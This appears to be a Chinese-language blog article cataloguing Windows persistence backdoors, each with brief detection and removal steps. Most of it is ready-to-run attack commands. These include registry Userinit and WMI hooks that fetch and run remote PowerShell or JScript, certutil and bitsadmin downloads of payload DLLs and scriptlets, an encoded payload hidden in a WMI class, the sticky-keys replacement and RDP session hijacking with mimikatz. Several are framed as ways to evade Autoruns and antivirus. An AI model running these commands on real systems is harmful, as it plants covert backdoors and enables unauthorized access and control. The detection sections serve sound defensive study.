检测及查杀 12检测注册表相关键值Autoruns BootExecute Key可以通过它来实现启动Natvice程序，Native程序在驱动程序和系统核心加载后将被加载，此时会话管理器(smss.exe)进行windowsNT用户模式并开始按顺序启动native程序。由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元。具体注册表键值为： 12HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\hivelistHKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager 上述注册表下有一个名为BootExecute的多字符串值键，它的默认值是autocheck autochk *，用于系统启动时的某些自动检查。这个启动项目里的程序是在系统图形界面完成前就被执行的，所以具有很高的优先级。 检测及查杀 123检查注册表相关键值：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\hivelistHKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager Userinit KeyUserinit注册表键的作用是在用户进行登陆时，WinLogon进程加载的指定的login scripts，可以更改它的值来添加与删除程序。具体键值： 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon 一般情况下，其默认值为userinit.exe，由于该子键的值中可使用逗号分隔开多个程序，因此，在键值的数值中可加入其它程序。 结合上面powershell中的msf方法，可以达到无文件后门效果： 1234Powershell实现：Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name Userinit -value "C:\Windows\system32\userinit.exe,powershell.exe -nop -w hidden -c $w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring('http://192.168.2.11:8080/kaMhC1');"# powershell反弹shell的payload参照上面msf中的web_delivery模块 检测及查杀 1查看HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit LogonScripts keyLogon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截，具体键值： 123HKEY_CURRENT_USER\Environment\创建字符串键值: UserInitMprLogonScript键值设置为bat的绝对路径:c:\1.bat 检测及查杀 1查看HKEY_CURRENT_USER\Environment\UserInitMprLogonScript Startup Keys开始菜单启动项，指示启动文件夹的位置，User Shell Folders优先于Shell Folders。 1234HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell FoldersHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell FoldersHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell FoldersHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders 检测及查杀 12检查相关注册表键值Process Explorer Browser Helper Objects本质上是Internet Explorer启动时加载的DLL模块 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects 检测及查杀 12检查注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper ObjectsProcess Explorer AppInit_DLLs注册表中默认存在两个注册表项：AppInit_DLLs和LoadAppInit_DLLs(win2003没有，但是可以新建)，User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，如果有值，调用LoadLibrary() api加载用户dll。PS：xp系统会忽略LoadAppInit_DLLs注册表项 严格来讲，此dll注入不是注入到所有运行进程，而是注入到加载User32.dll的进程中 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs 检测及查杀 123检查注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs查看异常dll文件通过Process Explorer查看进程加载dll 文件关联文件关联就是指系统把指定扩展名的文件自动关联到相应的应用程序，例如 .doc 默认打开方式是 Microsoft Word，当用户双击.doc文件时时就会启动 Word 打开该文件。 Windows的资源管理器识别文件类型是由扩展名决定的（而并不是文件头决定文件类型）。首先扩展名会对应一种文件类型，这种文件类型的不同操作再对应到不同的具体命令。 比如： 1234567.txt --&gt; txtfile --&gt; &#123; "open": "notepad.exe %1", "edit": "notepad.exe %1", ... &#125;文件扩展名与文件类型的对应关系，可以通过assoc命令查看或修改cmd&gt; assoc .txt.txt=txtfilecmd&gt; ftype txtfiletxtfile=%SystemRoot%\system32\NOTEPAD.EXE %1 相关的注册表： 12345678HKEY_CURRENT_USER\Software\Classe //保存了当前用户的文件关联设置HKEY_LOCAL_MACHINE\Software\Classe //保存了本机上所有用户的设置HKEY_CLASS_ROOT //上面两个位置下的键值合并，是为了访问方便而建立的视图HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\ //保存了右键选择"打开方式"改变默认的关联程序# 用户双击文件时查找顺序:# 首先检查...\\FileExts\\，找不到时查找HKCU，最后才是HKLM。因此检查一个文件是否与某个程序关联可以按照这个顺序检查。 检测及查杀 12检查注册表：HKEY_LOCAL_MACHINE\Software\Classe 、HKEY_CLASS_ROOT通过Process Explorer查看进程加载文件 映像劫持(IFEO)映像劫持（Image File Execution Options）其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如”explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的”dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到”劫持”的虚假程序。 简单点说就是：当你打开的是程序A，而运行的确是程序B。 注册表位置： 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options 比如： 123456781、找到注册表"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"目录下的iexplore.exe2、添加一个Debugger字符串值(REG_SZ)，并且赋值为calc.exe的执行路径"c:\windows\system32\calc.exe"3、运行iexplore.exe即可执行calc.exe# 命令行添加：# reg add "HKLM\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v debugger /t REG_SZ /d "c:\windows\system32\calc.exe" 但是这样设置直接是可以看到的，根据文章隐蔽后门——Image File Execution Options新玩法了解到可以修改GlobalFlag的值，达到程序A静默退出结束后，会执行程序B的效果，且在注册表看不到具体值，同时Autorun检测不到。 123456789101112131415首先下载GFlages.exe的安装器dbg的安装包：http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi1、点击关卡：Silent Process Exit2、image处填写需要劫持的软件，比如：notepad.exe3、Reporting Mode处勾选Enable Silent Process Exit Monitoring和Launch monitor process4、Monitor Process处填写需要执行的软件，比如：c:\windows\system32\calc.exe5、应用-&gt;确定然后打开notepad.exe退出后即可看到calc.exe，同时notepad.exe对应的注册表中GlobalFlag无任何值# 命令行：# reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512# reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v ReportingMode /t REG_DWORD /d 1# reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "c:\windows\system32\calc.exe" 检测及查杀 1231、排查HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options以及HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit项值是否存在关联（上述例子即可在SilentProcessExit中看到c:\windows\system32\calc.exe）2、分析系统日志，日志ID为3000和3001，即有可能存在后门威胁3、直接删除IFEO项或者设置管理员不可修改 COM劫持COM（组件对象模型）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。为开发人员提供一个允许开发人员控制和操纵其他应用程序的对象的接口，每个COM对象都由一个名为CLSID的唯一ID定义，大多数COM类都在操作系统中注册，并由表示注册表中的类标识符（CLSID）的GUID标识，也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。 1234COM是Component Object Model （组件对象模型）的缩写COM组件由DLL和EXE形式发布的可执行代码所组成COM与语言，平台无关COM组件对应注册表中CLSID下的注册表键值 比如: 123按下Ctrl+R打开运行窗口，输入：::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125; -&gt; 我的电脑::&#123;645FF040-5081-101B-9F08-00AA002F954E&#125; -&gt; 回收站 使用ProcessMonitor可以看到应用程序的寻找过程： 1231、HKEY_CURRENT_USER\Software\Classes\CLSID2、HKEY_CLASSES_ROOT\CLSID3、HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\ 当进程寻找COM组件时，首先会寻找： HKCU\Software\Classes\CLSID，所以直接在CLSID下新建一个对象ID，就能够劫持某个进程或多个进程。 与DLL劫持原理相近，但是COM组件的劫持目标不一定是一个进程，也可以是一个Windows API，劫持所需的文件不一定是一个DLL，它可以是一个.com文件、二进制PE文件、DLL文件。 MSF中自带了利用COM劫持的模块：exploit/windows/local/bypassuac_comhijack，该模块同时直接可以绕过UAC，具体原理参考：COM Hijacking CLRCLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。无需管理员权限的后门，并能够劫持所有.Net程序。 12345678910111213141516cmd&gt; SET COR_ENABLE_PROFILING=1cmd&gt; SET COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;# &#123;11111111-1111-1111-1111-111111111111&#125;表示CLSID可设置为任意数值，只要和系统常用CLSID不冲突就行cmd&gt; certutil.exe -urlcache -split -f http://evil.com/msg.dll# 下载dllcmd&gt; certutil.exe -urlcache -split -f http://evil.com/msg.dll delete# 清除下载文件的缓存cmd&gt; SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32# 新建子项&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32cmd&gt; REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F# 新建REG_SZ类型键值ThreadingModel:Apartmentcmd&gt; REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F# 修改默认路径值为msg.dll的路径cmd&gt; 当前cmd下启动.net程序，比如：powershell，即可执行dllDLL编写参考：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/ 要使CLR能够劫持系统中全部.net程序，需要设置环境变量，可以图形化界面操作，也可以使用WMI（通过WMI修改环境变量需要系统重启或注销重新登录才能生效）。 x86系统 1234567wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="&#123;11111111-1111-1111-1111-111111111111&#125;"certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dllcertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll deleteSET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /FREG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F x64系统 123456789101112wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="&#123;11111111-1111-1111-1111-111111111111&#125;"certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dllcertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll deletecertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dllcertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll deleteSET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg_x64.dll" /FREG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /FREG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F POC: https://github.com/3gstudent/CLR-Injection 检测及查杀 121、检查环境变量COR_ENABLE_PROFILING和COR_PROFILER2、检查注册表键值HKEY_CURRENT_USER\Software\Classes\CLSID\有无异常 CAccPropServicesClass&amp;MMDeviceEnumerato通过CLR劫持所有.Net程序的方法，无需管理员权限，可用作后门。但是通过WMI添加环境变量需要重启系统。 CAccPropServicesClass和MMDeviceEnumerato后门原理与之类似，但是不需要重启系统，同样也不需要管理员权限，同时可以绕过Autoruns对启动项的检测。 x86系统 12345678910111、新建文件在%APPDATA%\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\路径下加入后门dll文件；命名规则为：api-ms-win-downlevel-[4char-random]-l1-1-0._dl2、修改注册表注册表位置：HKEY_CURRENT_USER\Software\Classes\CLSID\创建项&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;创建子项InprocServer32Default的键值为32位dll的绝对路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\api-ms-win-downlevel-1x86-l1-1-0._dl创建键值：ThreadingModel | REG_SZ | Apartment3、当打开ie或者其他程序时，就会执行加载的dll x64系统 1234567891011121314151617181、新建文件在%APPDATA%\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\路径下加入后门dll文件；命名规则为：api-ms-win-downlevel-[4char-random]-l1-1-0._dl2、修改注册表1注册表位置：HKEY_CURRENT_USER\Software\Classes\CLSID\创建项&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;创建子项InprocServer32Default的键值为64位dll路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\api-ms-win-downlevel-1x64-l1-1-0._dl创建键值：ThreadingModel | REG_SZ | Apartment3、修改注册表2注册表位置：HKEY_CURRENT_USER\Software\Classes\Wow6432Node\CLSID\创建项&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;创建子项InprocServer32Default的键值为32位dll路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Installer&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\api-ms-win-downlevel-1x86-l1-1-0._dl创建键值：ThreadingModel | REG_SZ | Apartment4、当打开ie或者其他程序时，就会执行加载的dll POC：https://github.com/3gstudent/COM-Object-hijacking 检测及查杀 1234561、注册表键值HKEY_CURRENT_USER\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\HKEY_CURRENT_USER\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E &#125;2、文件路径%APPDATA%\Roaming\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\命名方式：api-ms-win-downlevel-[4char-random]-l1-1-0._dl MruPidlList不同于上面两种COM劫持后门，前两种是被动触发的后门，MruPidlList是主动触发的后门 12345注册表位置：HKEY_CURRENT_USER\Software\Classes\CLSID\创建项&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;创建子项InprocServer32Default的键值为dll的绝对路径：C:\test\calc.dll创建键值： ThreadingModel | REG_SZ | Apartment 因为注册表对应COM对象MruPidlList，作用于shell32.dll，shell32.dll用于打开网页和文件，所以当系统启动时必定会执行，于是后门也就会主动启动，相当于一个主动后门。 直观的理解：系统在启动时默认启动进程explorer.exe，explorer.exe会调用shell32.dll，加载COM对象MruPidlList 此类型的后门多次被恶意软件使用：comRAT，ZeroAccess rootkit，bbsrat 检测和查杀 1查看、记录、监控注册表HKEY_CURRENT_USER\Software\Classes\CLSID\的写入和修改操作 系统软件wmiWMI（Windows Management Instrumentation）即 Windows 管理规范，由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统。 WMI相关知识参考翻译： WMI 的攻击，防御与取证分析技术之攻击篇 WMI 的攻击，防御与取证分析技术之防御篇 WMI 的攻击，防御与取证分析技术之取证分析篇 原文：https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf Drops: 三好学生： WMI Attacks: http://drops.xmd5.com/static/drops/tips-8189.html WMI Backdoor: http://drops.xmd5.com/static/drops/tips-8260.html WMI Defense: http://drops.xmd5.com/static/drops/tips-8290.html 不在Client和Server留下任何文件，实际位于硬盘上的一个复杂的数据库中(objects.data) 不改动注册表 仅使用powershell实现 存储payload 1234567# 管理员权限powershell&gt; $StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)powershell&gt; $StaticClass.Name = 'Win32_EvilClass'powershell&gt; $StaticClass.Put()powershell&gt; $StaticClass.Properties.Add('EvilProperty' , "This is payload")powershell&gt; $StaticClass.Put() 隐蔽定时启动程序 12345678910111213# 管理员权限# 功能：每60s执行一次notepad.exepowershell&gt; $filterName = 'BotFilter82'powershell&gt; $consumerName = 'BotConsumer23'# 创建一个__EventFilter，用于设定触发条件，每隔60s执行一次powershell&gt; $exePath = 'C:\Windows\System32\notepad.exe'powershell&gt; $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERETargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"powershell&gt; $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @&#123;Name= $filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query&#125; -ErrorAction Stop# 创建一个CommandLineEventConsumer，用于设定执行的操作powershell&gt; $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @&#123; Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath&#125;# 用于绑定filter和consumerpowershell&gt; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125; Example: 通常是通过powershell进行调用，配合schtasks进行定时启动，绕过杀软，也可以执行JavaScript脚本。 12345678#!powershell$filterName = 'filtP1'$consumerName = 'consP1'$Command ="GetObject(""script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"")" $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @&#123;Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query&#125; -ErrorAction Stop $WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments @&#123;Name=$consumerName;ScriptingEngine='JScript';ScriptText=$Command&#125; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125; 通过远程下载js脚本，进行命令调用。优点：无文件落地缺点：目前杀软对powershell这类监管较严格，容易被发现 检测及查杀 123456789101112131415161718192021222324252627282930检测：1、查看当前WMI Event（管理员权限）#List Event FiltersGet-WMIObject -Namespace root\Subscription -Class __EventFilter#List Event ConsumersGet-WMIObject -Namespace root\Subscription -Class __EventConsumer#List Event BindingsGet-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding2、查看日志Microsoft-Windows-WinRM/OperationalMicrosoft-Windows-WMI-Activity/OperationalMicrosoft-Windows-DistributedCOM3、AutorunsSysinternals Autoruns只能检测到ActiveScriptEventConsumer和CommandLineEventConsumer的操作，可以理解为上述对进程和注册表监视的操作无法识别查杀：1、清除后门（管理员权限）#FilterGet-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose#ConsumerGet-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose#BindingGet-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose2、甚至禁用Winmgmt服务从根本上阻止该方法的使用其他方法参考：http://drops.xmd5.com/static/drops/tips-8290.html Waitfor.exeWaitfor是用来接收或发送来自同一域内主机的信号。位于System32文件夹下，以命令行方式启动。 思路1：有文件 1234567891、在目标系统保存一个powershell脚本c:\waitfor1.ps1，内容为：start-process calc.execmd /c waitfor persist `&amp;`&amp; powershell -executionpolicy bypass -file c:\waitfor1.ps12、等待接受信号waitfor persist1 &amp;&amp; powershell -executionpolicy bypass -file c:\waitfor1.ps13、发送信号waitfor /s 127.0.0.1 /si persist1#测试时不可持续利用 思路2：无文件 将powershell payload命令通过编码保存在WMI类中，进行存储、读取、使用payload（需要管理员权限） 12345678910111213141516171819PowerShell&gt; $StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)PowerShell&gt; $StaticClass.Name = 'Win32_Backdoor'PowerShell&gt; $StaticClass.Put()| Out-NullPowerShell&gt; $StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&amp;```&amp; taskkill /f /im powershell.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")PowerShell&gt; $StaticClass.Put() | Out-Null# 使用base64编码存储payloadPowerShell&gt; $exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;# 读取payloadPowerShell&gt; iex $exec | Out-Null# 执行payload# 也可将上述命令存储为文件，然后执行该文件# https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1# cmd&gt; powershell -executionpolicy bypass .\Waitfor-Persistence.ps1激活后门：cmd&gt; waitfor /s 127.0.0.1 /si persist#测试时可持续利用 POC：https://github.com/3gstudent/Waitfor-Persistence 检测及查杀 121、留意后台进程waitfor.exe2、使用Process Explorer查看后台可疑的cmd.exe和powershell.exe进程的启动参数 bitsadminbitsadmin.exe是windows自带的可用于创建下载或上载作业并监视其进度，bistadmin可以指定下载成功之后要进行什么命令。可绕过autorun、常见杀软检测。 12345678bitsadmin /create backdoor# 创建任务bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe# 下载本地文件bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"# 增加cmd参数，利用regsvr32技巧，解决命令执行弹框问题bitsadmin /Resume backdoor# 执行任务 检测及查杀 12345678列出所有任务bitsadmin /list /allusers /verbose删除某个任务bitsadmin /cancel &lt;Job&gt;删除所有任务bitsadmin /reset /allusers获取任务创建时间bitsadmin /GetCreationTime &lt;Job&gt; msdtcMSDTC，是微软分布式传输协调程序，Windows系统默认启动该服务。当计算机加入域中，MSDTC服务启动时，会搜索注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI 分别加载3个DLL：oci.dll,SQLLib80.dll,xa80.dll 然而Windows系统默认并不包含oci.dll所以可以将payload.dll重名为oci.dll并保存在%windir%\system32\下 域中的计算机启动服务MSDTC时就会加载该dll，实现代码执行。 利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测。 检测及查杀 123451、检测%windir%\system32\是否包含可疑oci.dll2、taskkill /f /im msdtc.exe3、Procmon# 对于普通用户主机，建议禁用服务MSDTC Netshnetsh是windows系统本身提供的功能强大的网络配置命令行工具 1netsh add helper c:\test\netshtest.dll helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll 检测及查杀 1234567检查：检查注册表位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh通过Process Explorer查看netsh进程加载的dll通过Process Monitor查看进程属性Event Properties清除：netsh delete helper c:\test\netshtest.dll在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh删除对应键值 DoubleAgent该方式主要是对微软系统自带的Application Verifier（应用程序检验器）进行利用 利用过程如下： 编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 1234命令行添加：appverif /verify notepad.exe命令行删除：appverif /n notepad.exe POC : https://github.com/Cybellum/DoubleAgent 检测及查杀 12监控注册表键值HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 查看c:\windows\system32\下有无可疑dll Office利用劫持系统的DLL，执行相关命令，同时可绕过Autoruns的后门检测。主要有两种方法： 劫持office特定功能 利用Office加载项 劫持Office软件的特定功能通过DLL劫持，在Office软件执行特定功能时触发后门 劫持Word-审阅-视图【管理员权限】：位于C:\Program Files\Common Files\microsoft shared\RRLoc14\LOCALSVC.DLL 劫持word-插入-图片【TrustedInstaller权限】：位于C:\Program Files\Common Files\microsoft shared\ink\tiptsf.dll 劫持word-文件-页面布局-主题-浏览主题【管理员权限】：位于C:\Program Files\Microsoft Office\Office14\2052\GrooveIntlResource.dll 劫持Excel-插入-图片【管理员权限】：位于C:\Program Files\Common Files\microsoft shared\OFFICE14\MSPTLS.DLL 利用Office加载项 Word WLL Excel XLL Excel VBA add-ins PowerPoint VBA add-ins 以word为例： 1234567891011121314151617# 编译成calc.dll，重命名为calc.wll，保存在路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Word\Startup（Startup路径可保存多个wll，支持启动多个wll），启动Word.exe，弹出计算器，并且word正常启动powershell下wll路径$env:APPDATA+"\Microsoft\Word\Startup\calc.wll"将编译好的calc.dll作base64加密并存储于变量中PowerShell&gt; $fileContent = [System.IO.File]::ReadAllBytes('calc.dll')PowerShell&gt; $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("calcdllbase64.txt") 用变量$fileContent存储base64加密的calc.dllPowerShell&gt; $fileContent = "$fileContentEncoded_payload"base64解密并释放calc.wll至Startup路径的代码如下：PowerShell&gt; $fileContentBytes = [System.Convert]::FromBase64String($fileContent) [System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\Word\Startup\calc.wll",$fileContentBytes)# 具体参考：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/ 其他POC：https://github.com/3gstudent/Office-Persistence 检测及查杀 12345禁用所有加载项禁用所有控件禁用所有宏删除信任位置：C:\Users\a\AppData\Roaming\Microsoft\Word\Startup\ shift后门通过远程桌面连接到Windows后，在没有输入用户名和密码前，连接按5次Shift键，可以调用c:\windows\system32\sethc.exe，所以需要把c:\windows\system32\sethc.exe替换成其他的执行程序即可执行该程序。 12345copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /ycopy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe /yattrib c:\windows\system32\sethc.exe +hattrib c:\windows\system32\dllcache\sethc.exe +h# attrib +h是添加隐藏属性 在windows xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators。 也可以使用命令，比如：使用MSSQL的xp_cmdshell 123456exec xp_cmdshell &apos;takeown /f c:\windows\system32\sethc.* /a /r /d y&apos;# 将所有者更改为管理员组(administrators)exec xp_cmdshell &apos;cacls c:\windows\system32\sethc.exe /T /E /G system:F&apos;# 赋予system完全控制权限exec xp_cmdshell &apos;copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y&apos;# 替换文件为cmd.exe 检测及查杀 121、检测c:\windows\system32\sethc.exe文件大小、时间2、连按5次shift键 RDP会话劫持RDP劫持简单的说就是在不知道另一账户密码的情况下直接切换到该用户会话下。 123456781、query user 查看服务器用户会话信息2、sc create sesshijack 创建一个sesshijack服务3、net start sesshijack 开启服务query usersc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#4"# rdp-tcp#4为正在活动中的其他会话net start sesshijack 无凭据时的会话劫持技巧是Benjamin Delpy（Mimikatz作者）在2011年提到的，所以Mimikatz模块也集成了此项功能 12345mimikatz.exemimikatz # ts::sessionsmimikatz # ts::remote /id:4 (4表示会话ID)mimikatz # privilege::debugmimikatz # ts::remote /id:4 检测及查杀 12341、使用可以记录这种攻击的工具，比如：Microsoft OMS, Windows Event Forwarding2、查找Mimikatz的相关依赖# 使用组策略来注销已断开的会话或者空闲的用户会话 other.NET后渗透下的权限维持：https://github.com/Ivan1ee/NetDLLSpy 密码记录：WinlogonHack、Gina 利用服务：sc create [ServerName] binPath= BinaryPathName 快捷方式后门： https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1 。。。 感谢大佬们分享的文章，还有很多要学习的。 参考文章：https://www.bodkin.ren/index.php/archives/431/ https://www.anquanke.com/post/id/171891 http://vinc.top/2015/09/15/metasploit-web-delivery/ 